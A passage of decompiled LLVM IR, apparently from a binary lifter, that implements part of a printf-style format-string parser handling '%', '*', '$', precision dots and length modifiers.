  %v3_137b0 = load i32, i32* %v2_137b0, align 4
  store i32 %v3_137b0, i32* %sb.global-to-local, align 4
  br i1 %v2_13790, label %bb, label %dec_label_pc_137d0

bb:                                               ; preds = %entry
  %v3_137b4 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_1381c

dec_label_pc_137c0:                               ; preds = %dec_label_pc_139a0
  %v0_137c0 = load i32, i32* %r0.global-to-local, align 4
  %v0_139d0.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_139c8

dec_label_pc_137c8:                               ; preds = %dec_label_pc_139cc
  %v1_137c8 = add i32 %v0_139d0.pre, 1
  store i32 %v1_137c8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_139e8

dec_label_pc_137d0:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_137d4

dec_label_pc_137d4:                               ; preds = %dec_label_pc_13808.dec_label_pc_137d4_crit_edge, %dec_label_pc_137d0
  %v1_137e4 = phi i32 [ %v1_137f8, %dec_label_pc_13808.dec_label_pc_137d4_crit_edge ], [ 0, %dec_label_pc_137d0 ]
  %v0_137d4 = phi i32 [ %v0_137d4.pre, %dec_label_pc_13808.dec_label_pc_137d4_crit_edge ], [ %tmp, %dec_label_pc_137d0 ]
  %v1_137d4 = inttoptr i32 %v0_137d4 to i32*
  %v2_137d4 = load i32, i32* %v1_137d4, align 4
  %v4_137d8 = mul i32 %v1_137e4, 4
  %v5_137d8 = add i32 %v2_137d4, %v4_137d8
  store i32 %v5_137d8, i32* %r3.global-to-local, align 4
  %v1_137dc = add i32 %v5_137d8, -4
  %v2_137dc = inttoptr i32 %v1_137dc to i32*
  %v3_137dc = load i32, i32* %v2_137dc, align 4
  store i32 %v3_137dc, i32* %r1.global-to-local, align 4
  store i32 %v25_13784, i32* %ip.global-to-local, align 4
  %v2_137e4 = add i32 %v1_137e4, %v25_13784
  store i32 %v2_137e4, i32* %r2.global-to-local, align 4
  %v1_137e8 = trunc i32 %v3_137dc to i8
  %v3_137e8 = add i32 %v2_137e4, -56
  %v4_137e8 = inttoptr i32 %v3_137e8 to i8*
  store i8 %v1_137e8, i8* %v4_137e8, align 1
  %v0_137ec = load i32, i32* %r2.global-to-local, align 4
  %v1_137ec = add i32 %v0_137ec, -56
  %v2_137ec = inttoptr i32 %v1_137ec to i8*
  %v3_137ec = load i8, i8* %v2_137ec, align 1
  %v4_137ec = zext i8 %v3_137ec to i32
  store i32 %v4_137ec, i32* %r2.global-to-local, align 4
  %v0_137f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_137f0 = add i32 %v0_137f0, -4
  %v2_137f0 = inttoptr i32 %v1_137f0 to i32*
  %v3_137f0 = load i32, i32* %v2_137f0, align 4
  store i32 %v3_137f0, i32* %r3.global-to-local, align 4
  %v9_137f4 = icmp eq i32 %v4_137ec, %v3_137f0
  %v0_137f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_137f8 = add i32 %v0_137f8, 1
  store i32 %v1_137f8, i32* %r0.global-to-local, align 4
  br i1 %v9_137f4, label %dec_label_pc_13800, label %dec_label_pc_13c18

dec_label_pc_13800:                               ; preds = %dec_label_pc_137d4
  %v2_13800 = icmp eq i8 %v3_137ec, 0
  br i1 %v2_13800, label %dec_label_pc_13810, label %dec_label_pc_13808

dec_label_pc_13808:                               ; preds = %dec_label_pc_13800
  %tmp166 = icmp ult i32 %v1_137f8, 32
  br i1 %tmp166, label %dec_label_pc_13808.dec_label_pc_137d4_crit_edge, label %dec_label_pc_13810

dec_label_pc_13808.dec_label_pc_137d4_crit_edge:  ; preds = %dec_label_pc_13808
  %v0_137d4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_137d4

dec_label_pc_13810:                               ; preds = %dec_label_pc_13808, %dec_label_pc_13800
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_13818 = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_1381c

dec_label_pc_1381c:                               ; preds = %bb, %dec_label_pc_13810
  %storemerge102 = phi i32 [ %v2_13818, %dec_label_pc_13810 ], [ %v3_137b4, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_1382c

dec_label_pc_13828:                               ; preds = %.thread22, %dec_label_pc_13938
  %v0_13828 = phi i32 [ %v2_139b0, %.thread22 ], [ %storemerge105, %dec_label_pc_13938 ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_13938 ]
  store i32 %v0_13828, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1382c

dec_label_pc_1382c:                               ; preds = %dec_label_pc_1381c, %dec_label_pc_13828
  %v1_13848 = phi i32 [ %storemerge102, %dec_label_pc_1381c ], [ %v0_13828, %dec_label_pc_13828 ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_1381c ], [ %stack_var_-48.0, %dec_label_pc_13828 ]
  %v1_1382c = inttoptr i32 %v1_13848 to i8*
  %v2_1382c = load i8, i8* %v1_1382c, align 1
  %v3_1382c = zext i8 %v2_1382c to i32
  store i32 %v3_1382c, i32* %r3.global-to-local, align 4
  %v7_13830 = icmp eq i8 %v2_1382c, 42
  br i1 %v7_13830, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_1382c
  store i32 %v1_13848, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_1382c
  %v1_1383c = load i32, i32* @lr, align 4
  %v4_1383c = mul i32 %v1_1383c, -4
  %v5_1383c = add i32 %v4_1383c, %v25_13784
  store i32 %v5_1383c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_13848 = add i32 %v1_13848, 1
  store i32 %v2_13848, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_13850 = add i32 %v5_1383c, -12
  %v4_13850 = inttoptr i32 %v3_13850 to i32*
  store i32 0, i32* %v4_13850, align 4
  %v0_13874.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_13874.pre = phi i32 [ %v0_13874.pre.pre, %bb124 ], [ %v1_13848, %.thread9.thread ]
  %v2_13878.pre = load i32, i32* @global_var_29594, align 4
  br label %.backedge

dec_label_pc_13858:                               ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_1385c = load i32, i32* %r0.global-to-local, align 4
  %v7_13860 = icmp sgt i32 %v0_1385c, 4094
  br i1 %v7_13860, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_13858
  %v1_1386814 = add i32 %v0_138ec, 1
  store i32 %v1_1386814, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_13858
  %v11_13864 = mul i32 %v0_1385c, 10
  %v12_13864 = add i32 %v11_13864, %v3_13874
  store i32 %v12_13864, i32* %r3.global-to-local, align 4
  %v1_13868 = add i32 %v0_138ec, 1
  store i32 %v1_13868, i32* %r6.global-to-local, align 4
  %v9_1386c = add i32 %v12_13864, -48
  store i32 %v9_1386c, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_138ec = phi i32 [ %v0_13874.pre, %.preheader ], [ %v1_13868, %bb126 ], [ %v1_1386814, %.thread12 ]
  store i32 ptrtoint (i32* @global_var_29594 to i32), i32* %r3.global-to-local, align 4
  %v1_13874 = inttoptr i32 %v0_138ec to i8*
  %v2_13874 = load i8, i8* %v1_13874, align 1
  %v3_13874 = zext i8 %v2_13874 to i32
  store i32 %v3_13874, i32* %r2.global-to-local, align 4
  store i32 %v2_13878.pre, i32* %r3.global-to-local, align 4
  %v3_1387c = mul nuw nsw i32 %v3_13874, 2
  %v4_1387c = add i32 %v3_1387c, %v2_13878.pre
  %v5_1387c = inttoptr i32 %v4_1387c to i8*
  %v6_1387c = load i8, i8* %v5_1387c, align 1
  %v8_1387c = zext i8 %v6_1387c to i32
  store i32 %v8_1387c, i32* %r3.global-to-local, align 4
  %v1_13880 = and i32 %v8_1387c, 8
  %v2_13880 = icmp eq i32 %v1_13880, 0
  br i1 %v2_13880, label %dec_label_pc_13888, label %dec_label_pc_13858

dec_label_pc_13888:                               ; preds = %.backedge
  %v0_13888 = load i32, i32* %r1.global-to-local, align 4
  %v1_13888 = add i32 %v0_13888, -1
  %v2_13888 = inttoptr i32 %v1_13888 to i8*
  %v3_13888 = load i8, i8* %v2_13888, align 1
  %v4_13888 = zext i8 %v3_13888 to i32
  store i32 %v4_13888, i32* %r3.global-to-local, align 4
  %v7_1388c = icmp eq i8 %v3_13888, 37
  br i1 %v7_1388c, label %dec_label_pc_13894, label %dec_label_pc_13950

dec_label_pc_13894:                               ; preds = %dec_label_pc_13888
  %v7_13894 = icmp eq i8 %v2_13874, 36
  %. = zext i1 %v7_13894 to i32
  store i32 %., i32* %ip.global-to-local, align 4
  %v0_138a0 = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_138a0, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_13894
  store i32 0, i32* %ip.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_13894, %bb130
  %v1_138fc = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_13894 ]
  %v2_138a8 = icmp eq i32 %v1_138fc, 0
  %v0_138d8 = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_138a8, label %dec_label_pc_138d8, label %dec_label_pc_138b0

dec_label_pc_138b0:                               ; preds = %thread-pre-split
  %v2_138d8 = icmp eq i32 %v0_138d8, 0
  %v1_138b4 = add i32 %v0_138ec, 1
  store i32 %v1_138b4, i32* %r1.global-to-local, align 4
  br i1 %v2_138d8, label %dec_label_pc_13c18, label %dec_label_pc_138bc

dec_label_pc_138bc:                               ; preds = %dec_label_pc_138b0
  %v2_138bc = sub i32 %v0_138a0, %v0_138d8
  %v4_138bc = xor i32 %v0_138d8, %v0_138a0
  %v5_138bc = xor i32 %v2_138bc, %v0_138a0
  %v6_138bc = and i32 %v5_138bc, %v4_138bc
  %v7_138bc = icmp slt i32 %v6_138bc, 0
  %v8_138bc = icmp slt i32 %v2_138bc, 0
  %v9_138bc = icmp eq i32 %v0_138a0, %v0_138d8
  %v3_138c0 = xor i1 %v8_138bc, %v7_138bc
  %v4_138c0 = or i1 %v9_138bc, %v3_138c0
  br i1 %v4_138c0, label %dec_label_pc_138d0, label %bb131

bb131:                                            ; preds = %dec_label_pc_138bc
  store i32 %v0_138a0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_138d0

dec_label_pc_138cc:                               ; preds = %dec_label_pc_138ec, %dec_label_pc_138f4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_138d0

dec_label_pc_138d0:                               ; preds = %bb131, %dec_label_pc_138bc, %dec_label_pc_138cc
  %v0_138d0 = phi i32 [ %v0_13888, %dec_label_pc_138cc ], [ %v1_138b4, %dec_label_pc_138bc ], [ %v1_138b4, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_138cc ], [ %v0_138a0, %dec_label_pc_138bc ], [ %v0_138a0, %bb131 ]
  br label %dec_label_pc_13908

dec_label_pc_138d8:                               ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_138d8, 1
  br i1 %tmp132, label %dec_label_pc_138ec, label %dec_label_pc_138e0

dec_label_pc_138e0:                               ; preds = %dec_label_pc_138d8
  %v7_138e0 = icmp eq i8 %v2_13874, 109
  br i1 %v7_138e0, label %dec_label_pc_13950, label %dec_label_pc_13c18

dec_label_pc_138ec:                               ; preds = %dec_label_pc_138d8
  %tmp167 = icmp ugt i32 %v0_138ec, %v0_13888
  br i1 %tmp167, label %dec_label_pc_138f4, label %dec_label_pc_138cc

dec_label_pc_138f4:                               ; preds = %dec_label_pc_138ec
  %v1_138f4 = inttoptr i32 %v0_13888 to i8*
  %v2_138f4 = load i8, i8* %v1_138f4, align 1
  %v3_138f4 = zext i8 %v2_138f4 to i32
  store i32 %v3_138f4, i32* %r3.global-to-local, align 4
  %v7_138f8 = icmp eq i8 %v2_138f4, 48
  br i1 %v7_138f8, label %dec_label_pc_138cc, label %bb133

bb133:                                            ; preds = %dec_label_pc_138f4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13950

dec_label_pc_13908.loopexit:                      ; preds = %dec_label_pc_13910
  %v1_1391c = load i32, i32* @r4, align 4
  %v3_1391c = or i32 %v1_1391c, %v0_13930
  store i32 %v3_1391c, i32* @r4, align 4
  %v2_13920 = add i32 %storemerge105, 1
  br label %dec_label_pc_13908

dec_label_pc_13908:                               ; preds = %dec_label_pc_13908.loopexit, %dec_label_pc_138d0
  %storemerge105 = phi i32 [ %v0_138d0, %dec_label_pc_138d0 ], [ %v2_13920, %dec_label_pc_13908.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1ff3c.1061 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_13914 = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_13910

dec_label_pc_13910:                               ; preds = %dec_label_pc_13928, %dec_label_pc_13908
  %v0_13930 = phi i32 [ %v2_13930, %dec_label_pc_13928 ], [ 1, %dec_label_pc_13908 ]
  %v0_13910 = phi i32 [ %v5_13910, %dec_label_pc_13928 ], [ ptrtoint ([8 x i8]* @global_var_1ff3c.1061 to i32), %dec_label_pc_13908 ]
  %v1_13910 = inttoptr i32 %v0_13910 to i8*
  %v2_13910 = load i8, i8* %v1_13910, align 1
  %v3_13910 = zext i8 %v2_13910 to i32
  store i32 %v3_13910, i32* %r2.global-to-local, align 4
  %v5_13910 = add i32 %v0_13910, 1
  store i32 %v5_13910, i32* %r1.global-to-local, align 4
  %v2_13914 = load i8, i8* %v1_13914, align 1
  %v3_13914 = zext i8 %v2_13914 to i32
  store i32 %v3_13914, i32* %r3.global-to-local, align 4
  %v9_13918 = icmp eq i8 %v2_13914, %v2_13910
  br i1 %v9_13918, label %dec_label_pc_13908.loopexit, label %dec_label_pc_13928

dec_label_pc_13928:                               ; preds = %dec_label_pc_13910
  %v1_13928 = inttoptr i32 %v5_13910 to i8*
  %v2_13928 = load i8, i8* %v1_13928, align 1
  %v3_13928 = zext i8 %v2_13928 to i32
  store i32 %v3_13928, i32* %r3.global-to-local, align 4
  %v2_1392c = icmp eq i8 %v2_13928, 0
  %v2_13930 = mul i32 %v0_13930, 2
  store i32 %v2_13930, i32* %r0.global-to-local, align 4
  br i1 %v2_1392c, label %dec_label_pc_13938, label %dec_label_pc_13910

dec_label_pc_13938:                               ; preds = %dec_label_pc_13928
  %v1_13938 = add i32 %storemerge105, -1
  %v2_13938 = inttoptr i32 %v1_13938 to i8*
  %v3_13938 = load i8, i8* %v2_13938, align 1
  %v7_1393c = icmp eq i8 %v3_13938, 37
  %v0_13940 = load i32, i32* @r4, align 4
  %v1_13940 = and i32 %v0_13940, 10
  store i32 %v1_13940, i32* %r3.global-to-local, align 4
  %v4_13944 = udiv i32 %v1_13940, 2
  %v5_13944 = sub nuw nsw i32 -1, %v4_13944
  %v6_13944 = and i32 %v0_13940, %v5_13944
  store i32 %v6_13944, i32* @r4, align 4
  br i1 %v7_1393c, label %dec_label_pc_1394c, label %dec_label_pc_13828

dec_label_pc_1394c:                               ; preds = %dec_label_pc_13938
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13950

dec_label_pc_13950:                               ; preds = %bb133, %dec_label_pc_13888, %dec_label_pc_138e0, %dec_label_pc_1394c
  %v1_13994 = phi i32 [ %storemerge105, %dec_label_pc_1394c ], [ %v0_138ec, %bb133 ], [ %v0_138ec, %dec_label_pc_138e0 ], [ %v0_138ec, %dec_label_pc_13888 ]
  %v0_13990 = phi i32 [ %v5_13910, %dec_label_pc_1394c ], [ %v0_13888, %bb133 ], [ %v0_13888, %dec_label_pc_138e0 ], [ %v0_13888, %dec_label_pc_13888 ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_1394c ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_138e0 ], [ %stack_var_-48.1, %dec_label_pc_13888 ]
  %v1_13950 = inttoptr i32 %v0_13990 to i8*
  %v2_13950 = load i8, i8* %v1_13950, align 1
  %v3_13950 = zext i8 %v2_13950 to i32
  store i32 %v3_13950, i32* %r3.global-to-local, align 4
  %v7_13954 = icmp eq i8 %v2_13950, 42
  br i1 %v7_13954, label %dec_label_pc_1395c, label %dec_label_pc_139a0

dec_label_pc_1395c:                               ; preds = %dec_label_pc_13950
  %v0_1395c = load i32, i32* %sb.global-to-local, align 4
  %v2_1395c = icmp eq i32 %v0_1395c, 0
  br i1 %v2_1395c, label %dec_label_pc_13990, label %dec_label_pc_13964

dec_label_pc_13964:                               ; preds = %dec_label_pc_1395c
  %v1_13964 = inttoptr i32 %v1_13994 to i8*
  %v2_13964 = load i8, i8* %v1_13964, align 1
  %v3_13964 = zext i8 %v2_13964 to i32
  store i32 %v3_13964, i32* %r3.global-to-local, align 4
  %v7_13968 = icmp eq i8 %v2_13964, 36
  br i1 %v7_13968, label %dec_label_pc_13970, label %dec_label_pc_13c18

dec_label_pc_13970:                               ; preds = %dec_label_pc_13964
  %v0_13970 = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_13970, 1
  br i1 %tmp134, label %dec_label_pc_13c18, label %dec_label_pc_13978

dec_label_pc_13978:                               ; preds = %dec_label_pc_13970
  store i32 %v25_13784, i32* %r1.global-to-local, align 4
  %v0_13980 = load i32, i32* @lr, align 4
  %v3_13980 = mul i32 %v0_13980, -4
  %v4_13980 = add i32 %v3_13980, %v25_13784
  store i32 %v4_13980, i32* %r3.global-to-local, align 4
  %v1_13984 = add i32 %v1_13994, 1
  store i32 %v1_13984, i32* %r6.global-to-local, align 4
  %v2_13988 = add i32 %v4_13980, -24
  %v3_13988 = inttoptr i32 %v2_13988 to i32*
  store i32 %v0_13970, i32* %v3_13988, align 4
  br label %dec_label_pc_1399c

dec_label_pc_13990:                               ; preds = %dec_label_pc_1395c
  %v1_13990 = add i32 %v0_13990, 1
  store i32 %v1_13990, i32* %r3.global-to-local, align 4
  %v9_13994 = icmp eq i32 %v1_13990, %v1_13994
  br i1 %v9_13994, label %dec_label_pc_1399c, label %dec_label_pc_13c18

dec_label_pc_1399c:                               ; preds = %dec_label_pc_13990, %dec_label_pc_13978
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_139a0

dec_label_pc_139a0:                               ; preds = %dec_label_pc_13950, %dec_label_pc_1399c
  %v0_139a0 = load i32, i32* @lr, align 4
  %v2_139a0 = icmp eq i32 %v0_139a0, 0
  br i1 %v2_139a0, label %dec_label_pc_139a8, label %dec_label_pc_137c0

dec_label_pc_139a8:                               ; preds = %dec_label_pc_139a0
  %v0_139a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_139a8 = inttoptr i32 %v0_139a8 to i8*
  %v2_139a8 = load i8, i8* %v1_139a8, align 1
  %v3_139a8 = zext i8 %v2_139a8 to i32
  store i32 %v3_139a8, i32* %r3.global-to-local, align 4
  %v7_139ac = icmp eq i8 %v2_139a8, 46
  br i1 %v7_139ac, label %.thread22, label %dec_label_pc_139c0

.thread22:                                        ; preds = %dec_label_pc_139a8
  %v2_139b0 = add i32 %v0_139a8, 1
  store i32 %v2_139b0, i32* %r6.global-to-local, align 4
  %v1_139b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_139b4, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_13828

dec_label_pc_139c0:                               ; preds = %dec_label_pc_139a8
  %v0_139c0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_139c0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_139c8

dec_label_pc_139c8:                               ; preds = %dec_label_pc_137c0, %dec_label_pc_139c0
  %v0_139d0.pre = phi i32 [ %v0_139a8, %dec_label_pc_139c0 ], [ %v0_139d0.pre.pre, %dec_label_pc_137c0 ]
  %storemerge = phi i32 [ -1, %dec_label_pc_139c0 ], [ %v0_137c0, %dec_label_pc_137c0 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1fee4.1063 to i32), i32* %r1.global-to-local, align 4
  %v1_139d0 = inttoptr i32 %v0_139d0.pre to i8*
  br label %dec_label_pc_139cc

dec_label_pc_139cc:                               ; preds = %dec_label_pc_139dc, %dec_label_pc_139c8
  %v0_139dc = phi i32 [ %v1_139dc, %dec_label_pc_139dc ], [ ptrtoint ([9 x i8]* @global_var_1fee4.1063 to i32), %dec_label_pc_139c8 ]
  %v1_139cc = inttoptr i32 %v0_139dc to i8*
  %v2_139cc = load i8, i8* %v1_139cc, align 1
  %v3_139cc = zext i8 %v2_139cc to i32
  store i32 %v3_139cc, i32* %r2.global-to-local, align 4
  %v2_139d0 = load i8, i8* %v1_139d0, align 1
  %v3_139d0 = zext i8 %v2_139d0 to i32
  store i32 %v3_139d0, i32* %r3.global-to-local, align 4
  %v9_139d4 = icmp eq i8 %v2_139d0, %v2_139cc
  br i1 %v9_139d4, label %dec_label_pc_137c8, label %dec_label_pc_139dc

dec_label_pc_139dc:                               ; preds = %dec_label_pc_139cc
  %v1_139dc = add i32 %v0_139dc, 1
  %v2_139dc = inttoptr i32 %v1_139dc to i8*
  %v3_139dc = load i8, i8* %v2_139dc, align 1
  %v4_139dc = zext i8 %v3_139dc to i32
  store i32 %v4_139dc, i32* %r3.global-to-local, align 4
  store i32 %v1_139dc, i32* %r1.global-to-local, align 4
  %v2_139e0 = icmp eq i8 %v3_139dc, 0
  br i1 %v2_139e0, label %dec_label_pc_139e8, label %dec_label_pc_139cc

dec_label_pc_139e8:                               ; preds = %dec_label_pc_139dc, %dec_label_pc_137c8
  %v1_13a08 = phi i32 [ %v1_137c8, %dec_label_pc_137c8 ], [ %v0_139d0.pre, %dec_label_pc_139dc ]
  %v1_13a04 = phi i32 [ %v0_139dc, %dec_label_pc_137c8 ], [ %v1_139dc, %dec_label_pc_139dc ]
  %v2_139ec = sub i32 %v1_13a04, ptrtoint ([9 x i8]* @global_var_1fee4.1063 to i32)
  store i32 %v2_139ec, i32* %r3.global-to-local, align 4
  %v8_139f4 = icmp sgt i32 %v2_139ec, 1
  br i1 %v8_139f4, label %.thread25, label %dec_label_pc_139f8

dec_label_pc_139f8:                               ; preds = %dec_label_pc_139e8
  %v1_139f8 = inttoptr i32 %v1_13a08 to i8*
  %v2_139f8 = load i8, i8* %v1_139f8, align 1
  %v3_139f8 = zext i8 %v2_139f8 to i32
  store i32 %v3_139f8, i32* %r2.global-to-local, align 4
  %v1_139fc = inttoptr i32 %v1_13a04 to i8*
  %v2_139fc = load i8, i8* %v1_139fc, align 1
  %v3_139fc = zext i8 %v2_139fc to i32
  store i32 %v3_139fc, i32* %r3.global-to-local, align 4
  %v9_13a00 = icmp eq i8 %v2_139f8, %v2_139fc
  br i1 %v9_13a00, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_139f8
  %v2_13a04 = add i32 %v1_13a04, 9
  store i32 %v2_13a04, i32* %r1.global-to-local, align 4
  %v2_13a08 = add i32 %v1_13a08, 1
  store i32 %v2_13a08, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_139f8, %dec_label_pc_139e8, %bb135
  %v0_13a10 = phi i32 [ %v1_13a04, %dec_label_pc_139f8 ], [ %v1_13a04, %dec_label_pc_139e8 ], [ %v2_13a04, %bb135 ]
  %v0_13a0c = phi i32 [ %v1_13a08, %dec_label_pc_139f8 ], [ %v1_13a08, %dec_label_pc_139e8 ], [ %v2_13a08, %bb135 ]
  %v1_13a0c = inttoptr i32 %v0_13a0c to i8*
  %v2_13a0c = load i8, i8* %v1_13a0c, align 1
  %v3_13a0c = zext i8 %v2_13a0c to i32
  store i32 %v3_13a0c, i32* %r2.global-to-local, align 4
  %v1_13a10 = add i32 %v0_13a10, 9
  %v2_13a10 = inttoptr i32 %v1_13a10 to i8*
  %v3_13a10 = load i8, i8* %v2_13a10, align 1
  %v4_13a10 = zext i8 %v3_13a10 to i32
  store i32 %v4_13a10, i32* %r3.global-to-local, align 4
  %v2_13a14 = icmp eq i8 %v2_13a0c, 0
  %v3_13a18 = mul nuw nsw i32 %v4_13a10, 256
  store i32 %v3_13a18, i32* @lr, align 4
  br i1 %v2_13a14, label %dec_label_pc_13c18, label %dec_label_pc_13a20

dec_label_pc_13a20:                               ; preds = %.thread25
  store i32 ptrtoint ([21 x i8]* @global_var_1ff24.1065 to i32), i32* %ip.global-to-local, align 4
  %v3_13a24 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_13a24, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13a28

dec_label_pc_13a28:                               ; preds = %dec_label_pc_13aac, %dec_label_pc_13a20
  %v1_13a38 = phi i32 [ %v1_13aac, %dec_label_pc_13aac ], [ ptrtoint ([21 x i8]* @global_var_1ff24.1065 to i32), %dec_label_pc_13a20 ]
  %v1_13a28 = inttoptr i32 %v1_13a38 to i8*
  %v2_13a28 = load i8, i8* %v1_13a28, align 1
  %v3_13a28 = zext i8 %v2_13a28 to i32
  store i32 %v3_13a28, i32* %r3.global-to-local, align 4
  %v9_13a2c = icmp eq i8 %v2_13a28, %v2_13a0c
  br i1 %v9_13a2c, label %dec_label_pc_13a34, label %dec_label_pc_13aac

dec_label_pc_13a34:                               ; preds = %dec_label_pc_13a28
  store i32 ptrtoint ([21 x i8]* @global_var_1ff24.1065 to i32), i32* %r3.global-to-local, align 4
  %v2_13a38 = sub i32 %v1_13a38, ptrtoint ([21 x i8]* @global_var_1ff24.1065 to i32)
  store i32 %v2_13a38, i32* %r2.global-to-local, align 4
  %v7_13a40 = icmp slt i32 %v2_13a38, 18
  br i1 %v7_13a40, label %bb137, label %dec_label_pc_13a44

dec_label_pc_13a44:                               ; preds = %dec_label_pc_13a34
  %v1_13a44 = and i32 %v3_13a18, 1024
  %v2_13a44 = icmp eq i32 %v1_13a44, 0
  br i1 %v2_13a44, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_13a44
  %v2_13a48 = add i32 %v2_13a38, -2
  store i32 %v2_13a48, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_13a34, %dec_label_pc_13a44, %bb136
  %v0_13a4c = phi i32 [ %v2_13a38, %dec_label_pc_13a34 ], [ %v2_13a38, %dec_label_pc_13a44 ], [ %v2_13a48, %bb136 ]
  %v1_13a4c = load i32, i32* %r7.global-to-local, align 4
  %v2_13a4c = add i32 %v1_13a4c, 32
  %v3_13a4c = inttoptr i32 %v2_13a4c to i32*
  store i32 %v0_13a4c, i32* %v3_13a4c, align 4
  store i32 ptrtoint (i32* @global_var_1ff17.1067 to i32), i32* %r1.global-to-local, align 4
  %v0_13a58.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13a54

dec_label_pc_13a54:                               ; preds = %dec_label_pc_13a54, %bb137
  %v0_13a54 = phi i32 [ %v1_13a54, %dec_label_pc_13a54 ], [ ptrtoint (i32* @global_var_1ff17.1067 to i32), %bb137 ]
  %v1_13a54 = add i32 %v0_13a54, 1
  %v2_13a54 = inttoptr i32 %v1_13a54 to i8*
  %v3_13a54 = load i8, i8* %v2_13a54, align 1
  %v4_13a54 = zext i8 %v3_13a54 to i32
  store i32 %v4_13a54, i32* %r3.global-to-local, align 4
  store i32 %v1_13a54, i32* %r1.global-to-local, align 4
  %v8_13a5c = icmp sgt i32 %v0_13a58.pre, %v4_13a54
  br i1 %v8_13a5c, label %dec_label_pc_13a54, label %dec_label_pc_13a60

dec_label_pc_13a60:                               ; preds = %dec_label_pc_13a54
  store i32 ptrtoint (i32* @global_var_1ff08.1071 to i32), i32* %r0.global-to-local, align 4
  %v2_13a68 = sub i32 %v1_13a54, ptrtoint (i32* @global_var_1ff18.1069 to i32)
  %v2_13a6c = mul i32 %v2_13a68, 2
  store i32 %v2_13a6c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1fef8.1073 to i32), i32* %ip.global-to-local, align 4
  %v2_13a74 = add i32 %v2_13a6c, ptrtoint (i32* @global_var_1ff08.1071 to i32)
  store i32 %v2_13a74, i32* %r2.global-to-local, align 4
  %v1_13a78 = add i32 %v2_13a6c, add (i32 ptrtoint (i32* @global_var_1ff08.1071 to i32), i32 1)
  %v2_13a78 = inttoptr i32 %v1_13a78 to i8*
  %v3_13a78 = load i8, i8* %v2_13a78, align 1
  %v4_13a78 = zext i8 %v3_13a78 to i32
  store i32 %v4_13a78, i32* %r1.global-to-local, align 4
  %v2_13a7c = add i32 %v2_13a6c, ptrtoint (i32* @global_var_1fef8.1073 to i32)
  store i32 %v2_13a7c, i32* %r2.global-to-local, align 4
  %v3_13a80 = inttoptr i32 %v2_13a74 to i8*
  %v4_13a80 = load i8, i8* %v3_13a80, align 2
  %v6_13a80 = zext i8 %v4_13a80 to i32
  store i32 %v6_13a80, i32* %r0.global-to-local, align 4
  %v1_13a84 = add i32 %v2_13a6c, add (i32 ptrtoint (i32* @global_var_1fef8.1073 to i32), i32 1)
